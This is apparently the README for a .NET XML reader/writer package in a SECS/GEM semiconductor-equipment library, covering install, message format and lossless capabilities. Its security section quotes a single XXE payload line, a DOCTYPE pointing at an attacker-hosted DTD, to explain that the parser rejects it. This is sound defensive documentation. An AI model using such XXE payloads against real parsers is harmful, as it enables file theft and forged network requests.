# Barbatos.SecsGem.Serialization.Xml

XML reader and writer for **.NET 8, 9 and 10** - lossless, schema-friendly, and hardened against
the two XML features nobody wants in a fab.

> Part of **[Barbatos.SecsGem](https://github.com/Barbatos-Labs/Barbatos.SecsGem)** - a modern, allocation-conscious SECS-II / HSMS-SS / GEM stack
> for .NET 8, 9 and 10.

## Install

```
dotnet add package Barbatos.SecsGem.Serialization.Xml
```

One call registers the reader, the writer and the transcoder they plug into:

```csharp
services.AddSecsXml();
```

## What it writes

```xml
<?xml version="1.0" encoding="utf-8"?>
<SecsMessages>
  <SecsMessage name="EventReportSend" s="6" f="11" w="true">
    <List label="Body">
      <U4 label="DATAID">1</U4>
      <U4 label="CEID">7001</U4>
      <List label="Reports">
        <List label="Report">
          <U4 label="RPTID">100</U4>
        </List>
      </List>
    </List>
  </SecsMessage>
</SecsMessages>
```

The element name **is** the format, so the document validates structurally rather than by
convention, and an unknown element is an error instead of a shrug. Labels are attributes, which is
the one place XML puts metadata without disturbing the content model.

## Lossless

| Capability | |
| --- | --- |
| `MultipleMessages` | yes |
| `MessageNames` | yes |
| `ItemLabels` | yes |
| `Comments` | yes |
| `ExactIntegers` | yes |
| `BinaryPayload` | yes |
| `Indentation` | yes |

`SecsFormatCapabilities.Lossless`, the same as SML. A conversion into XML never warns.

If you need a format that is both lossless and reviewable in a browser or a diff tool that
understands structure, this is the one.

## It refuses a DTD and an external entity, on purpose

```xml
<!DOCTYPE foo SYSTEM "http://attacker.example/evil.dtd">
```

That document is rejected, not fetched. So is any `<!ENTITY>` resolving to a file or a URL.

This is the billion-laughs and XXE class of problem, and the reason it matters here rather than in
the abstract: a recipe file arrives from a tool vendor, a customer or an email attachment, and the
process that parses it sits inside the fab network with a service account. A parser that resolves
an external entity turns a recipe into a request.

`DtdProcessing.Prohibit` and a null `XmlResolver` are set on the reader, and there is a test for
each. There is no option to turn them back on.

## Documentation

- Concepts and worked examples: this file.
- Member-by-member reference: [`API-REFERENCE.md`](API-REFERENCE.md).
- Repository overview: [Barbatos.SecsGem](https://github.com/Barbatos-Labs/Barbatos.SecsGem).

## Status

Version 0.1.0 - the public surface is still settling. See the roadmap in the
[repository README](https://github.com/Barbatos-Labs/Barbatos.SecsGem#roadmap).
